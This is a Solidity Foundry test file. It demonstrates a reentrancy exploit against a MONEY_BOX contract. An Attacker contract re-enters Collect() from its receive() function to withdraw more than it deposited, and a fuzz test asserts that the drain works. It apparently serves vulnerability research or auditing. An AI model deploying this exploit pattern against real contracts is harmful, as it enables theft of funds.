
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MONEY_BOX, Log} from "../src/MONEY_BOX.sol";

contract TestReentrancyMONEY_BOX is Test {
    MONEY_BOX public _contractUnderTest;
    Log public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new Log();
        _contractUnderTest = new MONEY_BOX();
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.SetMinSum(0);
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsCollectMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0.01 ether && attackVal < 10 ether);

        vm.deal(address(_contractUnderTest), attackVal * 3);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        
        vm.warp(block.timestamp + 1);
        
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MONEY_BOX public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = MONEY_BOX(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        _victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;

        _victim.Collect(val);

        if (attackCallCount > 1 && address(this).balance > initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        if (attackCallCount < 3 && address(_victim).balance >= storedAttackVal) {
            _victim.Collect(storedAttackVal);
        }
    }
}
